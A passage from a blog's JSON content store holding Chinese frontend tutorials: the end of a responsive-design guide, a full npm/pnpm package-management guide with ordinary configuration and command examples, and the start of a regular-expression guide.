data-label=\\"\u90ae\u7bb1\\">zhang@example.com</td>\\n  <td data-label=\\"\u7535\u8bdd\\">13800138000</td>\\n</tr>\\n```\\n\\n---\\n\\n## \ud83c\udfaf \u5b9e\u7528\u6280\u5de7\\n\\n### \u9690\u85cf/\u663e\u793a\u5143\u7d20\\n\\n```css\\n/* \u53ea\u5728\u79fb\u52a8\u7aef\u663e\u793a */\\n.mobile-only {\\n  display: block;\\n}\\n@media (min-width: 768px) {\\n  .mobile-only {\\n    display: none;\\n  }\\n}\\n\\n/* \u53ea\u5728\u684c\u9762\u7aef\u663e\u793a */\\n.desktop-only {\\n  display: none;\\n}\\n@media (min-width: 768px) {\\n  .desktop-only {\\n    display: block;\\n  }\\n}\\n```\\n\\n### \u89e6\u6478\u53cb\u597d\\n\\n```css\\n/* \u589e\u5927\u70b9\u51fb\u533a\u57df */\\n.button {\\n  min-height: 44px;\\n  min-width: 44px;\\n  padding: 12px 24px;\\n}\\n\\n/* \u7981\u7528 hover \u5728\u89e6\u6478\u8bbe\u5907 */\\n@media (hover: hover) {\\n  .button:hover {\\n    background: #f0f0f0;\\n  }\\n}\\n```\\n\\n### \u5b89\u5168\u533a\u57df\\n\\n```css\\n/* \u9002\u914d iPhone \u5218\u6d77\u5c4f */\\n.header {\\n  padding-top: env(safe-area-inset-top);\\n}\\n\\n.footer {\\n  padding-bottom: env(safe-area-inset-bottom);\\n}\\n\\nbody {\\n  padding-left: env(safe-area-inset-left);\\n  padding-right: env(safe-area-inset-right);\\n}\\n```\\n\\n---\\n\\n## \ud83d\udee0\ufe0f \u8c03\u8bd5\u5de5\u5177\\n\\n### Chrome DevTools\\n\\n```markdown\\n1. \u6253\u5f00 DevTools (F12)\\n2. \u70b9\u51fb\u8bbe\u5907\u5de5\u5177\u680f\u56fe\u6807\\n3. \u9009\u62e9\u9884\u8bbe\u8bbe\u5907\u6216\u81ea\u5b9a\u4e49\u5c3a\u5bf8\\n4. \u6d4b\u8bd5\u4e0d\u540c\u65ad\u70b9\\n```\\n\\n### \u54cd\u5e94\u5f0f\u68c0\u67e5\u6e05\u5355\\n\\n```markdown\\n- [ ] 320px (iPhone SE)\\n- [ ] 375px (iPhone X)\\n- [ ] 414px (iPhone Plus)\\n- [ ] 768px (iPad)\\n- [ ] 1024px (iPad Pro)\\n- [ ] 1280px (\u7b14\u8bb0\u672c)\\n- [ ] 1920px (\u684c\u9762)\\n```\\n\\n---\\n\\n## \ud83d\udccb \u6700\u4f73\u5b9e\u8df5\\n\\n```markdown\\n1. \u79fb\u52a8\u4f18\u5148\\n   - \u5148\u8bbe\u8ba1\u79fb\u52a8\u7aef\uff0c\u518d\u6269\u5c55\u5230\u684c\u9762\\n   - \u4f7f\u7528 min-width \u5a92\u4f53\u67e5\u8be2\\n\\n2. \u4f7f\u7528\u76f8\u5bf9\u5355\u4f4d\\n   - rem \u7528\u4e8e\u5b57\u4f53\\n   - % \u6216 vw \u7528\u4e8e\u5e03\u5c40\\n   - px \u7528\u4e8e\u8fb9\u6846\u7b49\u56fa\u5b9a\u503c\\n\\n3. \u5f39\u6027\u5e03\u5c40\\n   - \u4f18\u5148\u4f7f\u7528 Flexbox \u548c Grid\\n   - \u4f7f\u7528 minmax() \u548c auto-fit\\n\\n4. \u6027\u80fd\u8003\u8651\\n   - \u6309\u9700\u52a0\u8f7d\u56fe\u7247\\n   - \u907f\u514d\u5728\u5a92\u4f53\u67e5\u8be2\u4e2d\u91cd\u590d\u5927\u91cf\u6837\u5f0f\\n\\n5. \u6d4b\u8bd5\u771f\u673a\\n   - \u6a21\u62df\u5668\u4e0d\u80fd\u66ff\u4ee3\u771f\u673a\u6d4b\u8bd5\\n   - \u6d4b\u8bd5\u89e6\u6478\u4ea4\u4e92\\n```\\n\\n---\\n\\n\u54cd\u5e94\u5f0f\u8bbe\u8ba1\u7684\u6838\u5fc3\u662f**\u5185\u5bb9\u4f18\u5148**\u3002\u5148\u786e\u5b9a\u5185\u5bb9\u7ed3\u6784\uff0c\u518d\u8003\u8651\u5982\u4f55\u5728\u4e0d\u540c\u5c3a\u5bf8\u4e0a\u5c55\u793a\u3002"},{"id":"npm-pnpm-guide","metadata":{"permalink":"/blog/npm-pnpm-guide","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-08-01-npm-pnpm.md","source":"@site/blog/2024-08-01-npm-pnpm.md","title":"npm/pnpm \u5305\u7ba1\u7406\u5b9e\u8df5\u6307\u5357","description":"\u5305\u7ba1\u7406\u5668\u662f\u524d\u7aef\u5f00\u53d1\u7684\u57fa\u7840\u5de5\u5177\u3002\u672c\u6587\u5bf9\u6bd4 npm \u548c pnpm\uff0c\u5206\u4eab\u6700\u4f73\u5b9e\u8df5\u3002","date":"2024-08-01T00:00:00.000Z","tags":[{"inline":true,"label":"npm","permalink":"/blog/tags/npm"},{"inline":true,"label":"pnpm","permalink":"/blog/tags/pnpm"},{"inline":true,"label":"\u5de5\u5177","permalink":"/blog/tags/\u5de5\u5177"},{"inline":true,"label":"\u524d\u7aef\u5de5\u7a0b\u5316","permalink":"/blog/tags/\u524d\u7aef\u5de5\u7a0b\u5316"}],"readingTime":3.83,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"npm-pnpm-guide","title":"npm/pnpm \u5305\u7ba1\u7406\u5b9e\u8df5\u6307\u5357","authors":"mason","tags":["npm","pnpm","\u5de5\u5177","\u524d\u7aef\u5de5\u7a0b\u5316"]},"unlisted":false,"prevItem":{"title":"\u54cd\u5e94\u5f0f\u8bbe\u8ba1\u5b9e\u6218\u6307\u5357","permalink":"/blog/responsive-design"},"nextItem":{"title":"\u6b63\u5219\u8868\u8fbe\u5f0f\u5b9e\u6218\u6280\u5de7","permalink":"/blog/regex-practical-guide"}},"content":"\u5305\u7ba1\u7406\u5668\u662f\u524d\u7aef\u5f00\u53d1\u7684\u57fa\u7840\u5de5\u5177\u3002\u672c\u6587\u5bf9\u6bd4 npm \u548c pnpm\uff0c\u5206\u4eab\u6700\u4f73\u5b9e\u8df5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83d\udce6 \u5305\u7ba1\u7406\u5668\u5bf9\u6bd4\\n\\n| \u7279\u6027 | npm | pnpm |\\n|------|-----|------|\\n| \u5b89\u88c5\u901f\u5ea6 | \u6162 | \u5feb 2-3 \u500d |\\n| \u78c1\u76d8\u5360\u7528 | \u5927\uff08\u91cd\u590d\u5b89\u88c5\uff09 | \u5c0f\uff08\u786c\u94fe\u63a5\uff09 |\\n| node_modules \u7ed3\u6784 | \u6241\u5e73\u5316 | \u7b26\u53f7\u94fe\u63a5 |\\n| \u5e7d\u7075\u4f9d\u8d56 | \u5b58\u5728 | \u907f\u514d |\\n| Monorepo \u652f\u6301 | workspaces | \u5185\u7f6e workspace |\\n\\n---\\n\\n## \ud83d\ude80 pnpm \u5feb\u901f\u4e0a\u624b\\n\\n### \u5b89\u88c5\\n\\n```bash\\n# \u4f7f\u7528 npm \u5b89\u88c5\\nnpm install -g pnpm\\n\\n# \u4f7f\u7528 Homebrew\\nbrew install pnpm\\n\\n# \u4f7f\u7528 corepack (Node.js 16.13+)\\ncorepack enable\\ncorepack prepare pnpm@latest --activate\\n```\\n\\n### \u5e38\u7528\u547d\u4ee4\\n\\n```bash\\n# \u5b89\u88c5\u4f9d\u8d56\\npnpm install\\npnpm i\\n\\n# \u6dfb\u52a0\u4f9d\u8d56\\npnpm add lodash\\npnpm add -D typescript    # devDependencies\\npnpm add -g serve         # \u5168\u5c40\u5b89\u88c5\\n\\n# \u79fb\u9664\u4f9d\u8d56\\npnpm remove lodash\\npnpm rm lodash\\n\\n# \u66f4\u65b0\u4f9d\u8d56\\npnpm update\\npnpm up lodash\\npnpm up --latest          # \u66f4\u65b0\u5230\u6700\u65b0\u7248\u672c\\n\\n# \u8fd0\u884c\u811a\u672c\\npnpm run dev\\npnpm dev                  # \u7b80\u5199\\n\\n# \u6267\u884c\u547d\u4ee4\\npnpm exec tsc\\npnpm dlx create-react-app my-app  # \u7c7b\u4f3c npx\\n```\\n\\n---\\n\\n## \ud83d\udccb package.json \u8be6\u89e3\\n\\n### \u57fa\u672c\u7ed3\u6784\\n\\n```json\\n{\\n  \\"name\\": \\"my-project\\",\\n  \\"version\\": \\"1.0.0\\",\\n  \\"description\\": \\"\u9879\u76ee\u63cf\u8ff0\\",\\n  \\"main\\": \\"dist/index.js\\",\\n  \\"module\\": \\"dist/index.mjs\\",\\n  \\"types\\": \\"dist/index.d.ts\\",\\n  \\"scripts\\": {\\n    \\"dev\\": \\"vite\\",\\n    \\"build\\": \\"vite build\\",\\n    \\"test\\": \\"vitest\\"\\n  },\\n  \\"dependencies\\": {\\n    \\"react\\": \\"^18.2.0\\"\\n  },\\n  \\"devDependencies\\": {\\n    \\"typescript\\": \\"^5.0.0\\"\\n  }\\n}\\n```\\n\\n### \u7248\u672c\u53f7\u89c4\u5219\\n\\n```markdown\\n\u4e3b\u7248\u672c.\u6b21\u7248\u672c.\u8865\u4e01\u7248\u672c\\n  ^     ~     \u65e0\u524d\u7f00\\n\\n^18.2.0  \u2192 >=18.2.0 <19.0.0  (\u5141\u8bb8\u6b21\u7248\u672c\u548c\u8865\u4e01\u66f4\u65b0)\\n~18.2.0  \u2192 >=18.2.0 <18.3.0  (\u53ea\u5141\u8bb8\u8865\u4e01\u66f4\u65b0)\\n18.2.0   \u2192 \u7cbe\u786e\u7248\u672c\\n*        \u2192 \u4efb\u610f\u7248\u672c\\n>=18.0.0 \u2192 \u5927\u4e8e\u7b49\u4e8e\\n```\\n\\n### \u4f9d\u8d56\u7c7b\u578b\\n\\n```json\\n{\\n  \\"dependencies\\": {\\n    // \u751f\u4ea7\u4f9d\u8d56\uff0c\u6253\u5305\u4f1a\u5305\u542b\\n  },\\n  \\"devDependencies\\": {\\n    // \u5f00\u53d1\u4f9d\u8d56\uff0c\u6253\u5305\u4e0d\u5305\u542b\\n  },\\n  \\"peerDependencies\\": {\\n    // \u5bf9\u7b49\u4f9d\u8d56\uff0c\u5bbf\u4e3b\u9879\u76ee\u9700\u8981\u5b89\u88c5\\n    \\"react\\": \\"^18.0.0\\"\\n  },\\n  \\"optionalDependencies\\": {\\n    // \u53ef\u9009\u4f9d\u8d56\uff0c\u5b89\u88c5\u5931\u8d25\u4e0d\u4f1a\u62a5\u9519\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd12 \u9501\u6587\u4ef6\\n\\n### package-lock.json (npm)\\n\\n```json\\n{\\n  \\"name\\": \\"my-project\\",\\n  \\"lockfileVersion\\": 3,\\n  \\"packages\\": {\\n    \\"node_modules/lodash\\": {\\n      \\"version\\": \\"4.17.21\\",\\n      \\"resolved\\": \\"https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz\\",\\n      \\"integrity\\": \\"sha512-...\\"\\n    }\\n  }\\n}\\n```\\n\\n### pnpm-lock.yaml\\n\\n```yaml\\nlockfileVersion: \'6.0\'\\ndependencies:\\n  lodash:\\n    specifier: ^4.17.21\\n    version: 4.17.21\\npackages:\\n  /lodash@4.17.21:\\n    resolution: {integrity: sha512-...}\\n```\\n\\n### \u6700\u4f73\u5b9e\u8df5\\n\\n```markdown\\n\u2705 \u63d0\u4ea4\u9501\u6587\u4ef6\u5230 Git\\n\u2705 \u4e0d\u8981\u624b\u52a8\u4fee\u6539\u9501\u6587\u4ef6\\n\u2705 \u56e2\u961f\u4f7f\u7528\u76f8\u540c\u5305\u7ba1\u7406\u5668\\n\u2705 CI \u4f7f\u7528 npm ci / pnpm install --frozen-lockfile\\n```\\n\\n---\\n\\n## \u2699\ufe0f \u914d\u7f6e\u6587\u4ef6\\n\\n### .npmrc\\n\\n```ini\\n# \u955c\u50cf\u6e90\\nregistry=https://registry.npmmirror.com\\n\\n# \u79c1\u6709\u4ed3\u5e93\\n@mycompany:registry=https://npm.mycompany.com\\n\\n# \u8ba4\u8bc1\\n//npm.mycompany.com/:_authToken=${NPM_TOKEN}\\n\\n# \u5176\u4ed6\u914d\u7f6e\\nsave-exact=true\\nengine-strict=true\\n```\\n\\n### .nvmrc\\n\\n```\\n18.17.0\\n```\\n\\n### engines \u5b57\u6bb5\\n\\n```json\\n{\\n  \\"engines\\": {\\n    \\"node\\": \\">=18.0.0\\",\\n    \\"pnpm\\": \\">=8.0.0\\"\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udee0\ufe0f \u5b9e\u7528\u6280\u5de7\\n\\n### 1. \u67e5\u770b\u4f9d\u8d56\u4fe1\u606f\\n\\n```bash\\n# \u67e5\u770b\u5305\u4fe1\u606f\\nnpm info lodash\\npnpm info lodash\\n\\n# \u67e5\u770b\u5df2\u5b89\u88c5\u7248\u672c\\nnpm ls lodash\\npnpm ls lodash\\n\\n# \u67e5\u770b\u8fc7\u671f\u4f9d\u8d56\\nnpm outdated\\npnpm outdated\\n\\n# \u67e5\u770b\u4f9d\u8d56\u6811\\nnpm ls --all\\npnpm ls --depth 3\\n```\\n\\n### 2. \u6e05\u7406\u7f13\u5b58\\n\\n```bash\\n# npm\\nnpm cache clean --force\\n\\n# pnpm\\npnpm store prune\\npnpm store path  # \u67e5\u770b\u5b58\u50a8\u8def\u5f84\\n```\\n\\n### 3. \u5b89\u5168\u5ba1\u8ba1\\n\\n```bash\\n# \u5b89\u5168\u68c0\u67e5\\nnpm audit\\npnpm audit\\n\\n# \u81ea\u52a8\u4fee\u590d\\nnpm audit fix\\n```\\n\\n### 4. \u53d1\u5e03\u5305\\n\\n```bash\\n# \u767b\u5f55\\nnpm login\\npnpm login\\n\\n# \u53d1\u5e03\\nnpm publish\\npnpm publish\\n\\n# \u53d1\u5e03\u6d4b\u8bd5\u7248\\nnpm publish --tag beta\\n\\n# \u8bbe\u7f6e\u7248\u672c\\nnpm version patch  # 1.0.0 -> 1.0.1\\nnpm version minor  # 1.0.0 -> 1.1.0\\nnpm version major  # 1.0.0 -> 2.0.0\\n```\\n\\n---\\n\\n## \ud83d\udcc2 Workspaces\\n\\n### pnpm-workspace.yaml\\n\\n```yaml\\npackages:\\n  - \'packages/*\'\\n  - \'apps/*\'\\n```\\n\\n### \u76ee\u5f55\u7ed3\u6784\\n\\n```\\nmy-monorepo/\\n\u251c\u2500\u2500 package.json\\n\u251c\u2500\u2500 pnpm-workspace.yaml\\n\u251c\u2500\u2500 packages/\\n\u2502   \u251c\u2500\u2500 shared/\\n\u2502   \u2502   \u2514\u2500\u2500 package.json\\n\u2502   \u2514\u2500\u2500 utils/\\n\u2502       \u2514\u2500\u2500 package.json\\n\u2514\u2500\u2500 apps/\\n    \u251c\u2500\u2500 web/\\n    \u2502   \u2514\u2500\u2500 package.json\\n    \u2514\u2500\u2500 api/\\n        \u2514\u2500\u2500 package.json\\n```\\n\\n### Workspace \u547d\u4ee4\\n\\n```bash\\n# \u5b89\u88c5\u6240\u6709\u5305\u7684\u4f9d\u8d56\\npnpm install\\n\\n# \u5728\u7279\u5b9a\u5305\u4e2d\u8fd0\u884c\u547d\u4ee4\\npnpm --filter @myorg/web dev\\npnpm -F @myorg/web dev\\n\\n# \u5728\u6240\u6709\u5305\u4e2d\u8fd0\u884c\u547d\u4ee4\\npnpm -r build\\npnpm --recursive build\\n\\n# \u6dfb\u52a0\u5305\u4e4b\u95f4\u7684\u4f9d\u8d56\\npnpm -F @myorg/web add @myorg/shared\\n\\n# \u6dfb\u52a0\u5916\u90e8\u4f9d\u8d56\u5230\u7279\u5b9a\u5305\\npnpm -F @myorg/web add lodash\\n\\n# \u6dfb\u52a0\u5230\u6839\u9879\u76ee\\npnpm add -w typescript\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u811a\u672c\u6280\u5de7\\n\\n### \u5e76\u884c/\u4e32\u884c\u6267\u884c\\n\\n```json\\n{\\n  \\"scripts\\": {\\n    \\"build:all\\": \\"pnpm -r build\\",\\n    \\"dev\\": \\"pnpm -r --parallel dev\\",\\n    \\"test\\": \\"pnpm -r --sequential test\\"\\n  }\\n}\\n```\\n\\n### \u524d\u7f6e/\u540e\u7f6e\u811a\u672c\\n\\n```json\\n{\\n  \\"scripts\\": {\\n    \\"prebuild\\": \\"rm -rf dist\\",\\n    \\"build\\": \\"tsc\\",\\n    \\"postbuild\\": \\"echo \'Build complete!\'\\"\\n  }\\n}\\n```\\n\\n### \u8de8\u5e73\u53f0\u811a\u672c\\n\\n```bash\\n# \u5b89\u88c5 cross-env\\npnpm add -D cross-env\\n\\n# \u4f7f\u7528\\n\\"scripts\\": {\\n  \\"build\\": \\"cross-env NODE_ENV=production webpack\\"\\n}\\n```\\n\\n---\\n\\n## \u2753 \u5e38\u89c1\u95ee\u9898\\n\\n### \u5e7d\u7075\u4f9d\u8d56\\n\\n```markdown\\n\u95ee\u9898\uff1a\u9879\u76ee\u4e2d\u4f7f\u7528\u4e86\u672a\u58f0\u660e\u7684\u4f9d\u8d56\uff08\u901a\u8fc7\u5176\u4ed6\u5305\u95f4\u63a5\u5b89\u88c5\uff09\\n\\nnpm\uff1a\u6241\u5e73\u5316\u5b89\u88c5\uff0c\u53ef\u80fd\u53ef\u4ee5\u4f7f\u7528\u672a\u58f0\u660e\u7684\u5305\\npnpm\uff1a\u4e25\u683c\u6a21\u5f0f\uff0c\u5fc5\u987b\u663e\u5f0f\u58f0\u660e\\n\\n\u89e3\u51b3\uff1a\u4f7f\u7528 pnpm \u6216\u660e\u786e\u58f0\u660e\u6240\u6709\u4f7f\u7528\u7684\u4f9d\u8d56\\n```\\n\\n### \u4f9d\u8d56\u51b2\u7a81\\n\\n```bash\\n# \u67e5\u770b\u4e3a\u4ec0\u4e48\u5b89\u88c5\u4e86\u67d0\u4e2a\u7248\u672c\\npnpm why lodash\\n\\n# \u5f3a\u5236\u4f7f\u7528\u7279\u5b9a\u7248\u672c\\n# package.json\\n{\\n  \\"pnpm\\": {\\n    \\"overrides\\": {\\n      \\"lodash\\": \\"4.17.21\\"\\n    }\\n  }\\n}\\n```\\n\\n### \u5b89\u88c5\u5931\u8d25\\n\\n```bash\\n# \u6e05\u7406\u91cd\u8bd5\\nrm -rf node_modules\\nrm pnpm-lock.yaml\\npnpm install\\n\\n# \u5ffd\u7565\u811a\u672c\\npnpm install --ignore-scripts\\n```\\n\\n---\\n\\n## \ud83d\udcda \u63a8\u8350\u914d\u7f6e\\n\\n```json\\n{\\n  \\"scripts\\": {\\n    \\"preinstall\\": \\"npx only-allow pnpm\\"\\n  },\\n  \\"packageManager\\": \\"pnpm@8.10.0\\",\\n  \\"engines\\": {\\n    \\"node\\": \\">=18.0.0\\",\\n    \\"pnpm\\": \\">=8.0.0\\"\\n  }\\n}\\n```\\n\\n---\\n\\n\u9009\u62e9 pnpm \u53ef\u4ee5\u83b7\u5f97\u66f4\u597d\u7684\u6027\u80fd\u548c\u66f4\u4e25\u683c\u7684\u4f9d\u8d56\u7ba1\u7406\u3002\u5bf9\u4e8e\u65b0\u9879\u76ee\uff0c\u63a8\u8350\u4f7f\u7528 pnpm\u3002"},{"id":"regex-practical-guide","metadata":{"permalink":"/blog/regex-practical-guide","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-07-20-regex.md","source":"@site/blog/2024-07-20-regex.md","title":"\u6b63\u5219\u8868\u8fbe\u5f0f\u5b9e\u6218\u6280\u5de7","description":"\u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u6587\u672c\u5904\u7406\u7684\u5f3a\u5927\u5de5\u5177\u3002\u672c\u6587\u901a\u8fc7\u5b9e\u4f8b\u8bb2\u89e3\u5e38\u7528\u6b63\u5219\u6a21\u5f0f\u548c\u6280\u5de7\u3002","date":"2024-07-20T00:00:00.000Z","tags":[{"inline":true,"label":"\u6b63\u5219\u8868\u8fbe\u5f0f","permalink":"/blog/tags/\u6b63\u5219\u8868\u8fbe\u5f0f"},{"inline":true,"label":"JavaScript","permalink":"/blog/tags/java-script"},{"inline":true,"label":"\u5de5\u5177","permalink":"/blog/tags/\u5de5\u5177"}],"readingTime":4.43,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"regex-practical-guide","title":"\u6b63\u5219\u8868\u8fbe\u5f0f\u5b9e\u6218\u6280\u5de7","authors":"mason","tags":["\u6b63\u5219\u8868\u8fbe\u5f0f","JavaScript","\u5de5\u5177"]},"unlisted":false,"prevItem":{"title":"npm/pnpm \u5305\u7ba1\u7406\u5b9e\u8df5\u6307\u5357","permalink":"/blog/npm-pnpm-guide"},"nextItem":{"title":"Web \u6027\u80fd\u6307\u6807\u4e0e\u4f18\u5316\u5b9e\u6218","permalink":"/blog/web-vitals"}},"content":"\u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u6587\u672c\u5904\u7406\u7684\u5f3a\u5927\u5de5\u5177\u3002\u672c\u6587\u901a\u8fc7\u5b9e\u4f8b\u8bb2\u89e3\u5e38\u7528\u6b63\u5219\u6a21\u5f0f\u548c\u6280\u5de7\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83d\udcdd \u57fa\u7840\u8bed\u6cd5\\n\\n### \u5b57\u7b26\u5339\u914d\\n\\n| \u6a21\u5f0f | \u542b\u4e49 | \u793a\u4f8b |\\n|------|------|------|\\n| `.` | \u4efb\u610f\u5b57\u7b26\uff08\u9664\u6362\u884c\uff09 | `a.c` \u2192 abc, adc |\\n| `\\\\d` | \u6570\u5b57 [0-9] | `\\\\d+` \u2192 123 |\\n| `\\\\w` | \u5355\u8bcd\u5b57\u7b26 [a-zA-Z0-9_] | `\\\\w+` \u2192 hello_123 |\\n| `\\\\s` | \u7a7a\u767d\u5b57\u7b26 | `a\\\\sb` \u2192 a b |\\n| `\\\\D` | \u975e\u6570\u5b57 | `\\\\D+` \u2192 abc |\\n| `\\\\W` | \u975e\u5355\u8bcd\u5b57\u7b26 | `\\\\W+` \u2192 @#$ |\\n| `\\\\S` | \u975e\u7a7a\u767d | `\\\\S+` \u2192 hello |\\n\\n### \u91cf\u8bcd\\n\\n| \u6a21\u5f0f | \u542b\u4e49 | \u793a\u4f8b |\\n|------|------|------|\\n| `*` | 0 \u6b21\u6216\u591a\u6b21 | `ab*c` \u2192 ac, abc, abbc |\\n| `+` | 1 \u6b21\u6216\u591a\u6b21 | `ab+c` \u2192 abc, abbc |\\n| `?` | 0 \u6b21\u6216 1 \u6b21 | `ab?c` \u2192 ac, abc |\\n| `{n}` | \u6070\u597d n \u6b21 | `a{3}` \u2192 aaa |\\n| `{n,}` | \u81f3\u5c11 n \u6b21 | `a{2,}` \u2192 aa, aaa |\\n| `{n,m}` | n \u5230 m \u6b21 | `a{2,4}` \u2192 aa, aaa, aaaa |\\n\\n### \u8fb9\u754c\\n\\n| \u6a21\u5f0f | \u542b\u4e49 |\\n|------|------|\\n| `^` | \u5b57\u7b26\u4e32\u5f00\u5934 |\\n| `$` | \u5b57\u7b26\u4e32\u7ed3\u5c3e |\\n| `\\\\b` | \u5355\u8bcd\u8fb9\u754c |\\n| `\\\\B` | \u975e\u5355\u8bcd\u8fb9\u754c |\\n\\n### \u5206\u7ec4\u4e0e\u5f15\u7528\\n\\n```javascript\\n// \u6355\u83b7\u7ec4\\n/(ab)+/           // \u5339\u914d ab, abab, ababab\\n\\n// \u975e\u6355\u83b7\u7ec4\\n/(?:ab)+/         // \u5339\u914d\u4f46\u4e0d\u6355\u83b7\\n\\n// \u547d\u540d\u6355\u83b7\u7ec4\\n/(?<year>\\\\d{4})-(?<month>\\\\d{2})/\\n\\n// \u53cd\u5411\u5f15\u7528\\n/(\\\\w+)\\\\s+\\\\1/      // \u5339\u914d\u91cd\u590d\u5355\u8bcd: \\"the the\\"\\n```\\n\\n---\\n\\n## \ud83c\udfaf \u5e38\u7528\u6a21\u5f0f\\n\\n### \u90ae\u7bb1\u9a8c\u8bc1\\n\\n```javascript\\n// \u7b80\u5355\u7248\\nconst emailSimple = /^\\\\S+@\\\\S+\\\\.\\\\S+$/;\\n\\n// \u5b8c\u6574\u7248\\nconst email = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,}$/;\\n\\n// \u6d4b\u8bd5\\nemail.test(\'user@example.com\');  // true\\nemail.test(\'invalid-email\');     // false\\n```\\n\\n### \u624b\u673a\u53f7\u9a8c\u8bc1\\n\\n```javascript\\n// \u4e2d\u56fd\u5927\u9646\u624b\u673a\u53f7\\nconst phone = /^1[3-9]\\\\d{9}$/;\\n\\nphone.test(\'13800138000\');  // true\\nphone.test(\'12345678901\');  // false\\n```\\n\\n### URL \u5339\u914d\\n\\n```javascript\\nconst url = /^(https?:\\\\/\\\\/)?([\\\\w-]+\\\\.)+[\\\\w-]+(\\\\/[\\\\w-./?%&=]*)?$/;\\n\\nurl.test(\'https://example.com\');           // true\\nurl.test(\'http://sub.example.com/path\');   // true\\n```\\n\\n### \u5bc6\u7801\u5f3a\u5ea6\\n\\n```javascript\\n// \u81f3\u5c118\u4f4d\uff0c\u5305\u542b\u5927\u5c0f\u5199\u5b57\u6bcd\u548c\u6570\u5b57\\nconst password = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\\\\d)[a-zA-Z\\\\d]{8,}$/;\\n\\n// \u5e26\u7279\u6b8a\u5b57\u7b26\\nconst strongPassword = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\\\\d)(?=.*[@$!%*?&])[A-Za-z\\\\d@$!%*?&]{8,}$/;\\n```\\n\\n### IP \u5730\u5740\\n\\n```javascript\\n// IPv4\\nconst ipv4 = /^((25[0-5]|2[0-4]\\\\d|[01]?\\\\d\\\\d?)\\\\.){3}(25[0-5]|2[0-4]\\\\d|[01]?\\\\d\\\\d?)$/;\\n\\nipv4.test(\'192.168.1.1\');   // true\\nipv4.test(\'256.1.1.1\');     // false\\n```\\n\\n### \u4e2d\u6587\u5339\u914d\\n\\n```javascript\\n// \u5339\u914d\u4e2d\u6587\u5b57\u7b26\\nconst chinese = /[\\\\u4e00-\\\\u9fa5]+/;\\n\\n// \u4ec5\u4e2d\u6587\\nconst onlyChinese = /^[\\\\u4e00-\\\\u9fa5]+$/;\\n\\nchinese.test(\'\u4f60\u597d\u4e16\u754c\');  // true\\n```\\n\\n---\\n\\n## \ud83d\udd27 JavaScript \u65b9\u6cd5\\n\\n### test() - \u6d4b\u8bd5\u5339\u914d\\n\\n```javascript\\nconst regex = /hello/i;\\nregex.test(\'Hello World\');  // true\\n```\\n\\n### match() - \u83b7\u53d6\u5339\u914d\\n\\n```javascript\\nconst str = \'The rain in Spain\';\\nstr.match(/ain/g);  // [\'ain\', \'ain\']\\n\\n// \u6355\u83b7\u7ec4\\n\'2024-01-15\'.match(/(\\\\d{4})-(\\\\d{2})-(\\\\d{2})/);\\n// [\'2024-01-15\', \'2024\', \'01\', \'15\']\\n\\n// \u547d\u540d\u6355\u83b7\u7ec4\\n\'2024-01-15\'.match(/(?<year>\\\\d{4})-(?<month>\\\\d{2})-(?<day>\\\\d{2})/);\\n// groups: { year: \'2024\', month: \'01\', day: \'15\' }\\n```\\n\\n### replace() - \u66ff\u6362\\n\\n```javascript\\n// \u7b80\u5355\u66ff\u6362\\n\'hello world\'.replace(/world/, \'regex\');  // \'hello regex\'\\n\\n// \u5168\u5c40\u66ff\u6362\\n\'aaa\'.replace(/a/g, \'b\');  // \'bbb\'\\n\\n// \u4f7f\u7528\u6355\u83b7\u7ec4\\n\'John Smith\'.replace(/(\\\\w+)\\\\s(\\\\w+)/, \'$2, $1\');  // \'Smith, John\'\\n\\n// \u51fd\u6570\u66ff\u6362\\n\'hello\'.replace(/./g, (char) => char.toUpperCase());  // \'HELLO\'\\n```\\n\\n### split() - \u5206\u5272\\n\\n```javascript\\n\'a, b,  c\'.split(/,\\\\s*/);  // [\'a\', \'b\', \'c\']\\n```\\n\\n### matchAll() - \u8fed\u4ee3\u6240\u6709\u5339\u914d\\n\\n```javascript\\nconst str = \'test1test2test3\';\\nconst matches = str.matchAll(/test(\\\\d)/g);\\n\\nfor (const match of matches) {\\n  console.log(match[0], match[1]);\\n}\\n// test1 1\\n// test2 2\\n// test3 3\\n```\\n\\n---\\n\\n## \ud83d\udca1 \u5b9e\u6218\u6280\u5de7\\n\\n### 1. \u8d2a\u5a6a vs \u61d2\u60f0\\n\\n```javascript\\nconst str = \'<div>content</div>\';\\n\\n// \u8d2a\u5a6a\uff08\u9ed8\u8ba4\uff09- \u5c3d\u53ef\u80fd\u591a\u5339\u914d\\nstr.match(/<.*>/);    // [\'<div>content</div>\']\\n\\n// \u61d2\u60f0 - \u5c3d\u53ef\u80fd\u5c11\u5339\u914d\\nstr.match(/<.*?>/);   // [\'<div>\']\\n```\\n\\n### 2. \u5148\u884c\u65ad\u8a00\\n\\n```javascript\\n// \u6b63\u5411\u5148\u884c\u65ad\u8a00 (?=)\\n// \u5339\u914d\u540e\u9762\u8ddf\u7740\u7279\u5b9a\u5185\u5bb9\u7684\\n\'100px 200em\'.match(/\\\\d+(?=px)/g);  // [\'100\']\\n\\n// \u8d1f\u5411\u5148\u884c\u65ad\u8a00 (?!)\\n// \u5339\u914d\u540e\u9762\u4e0d\u8ddf\u7740\u7279\u5b9a\u5185\u5bb9\u7684\\n\'100px 200em\'.match(/\\\\d+(?!px)/g);  // [\'10\', \'200\']\\n```\\n\\n### 3. \u540e\u884c\u65ad\u8a00\\n\\n```javascript\\n// 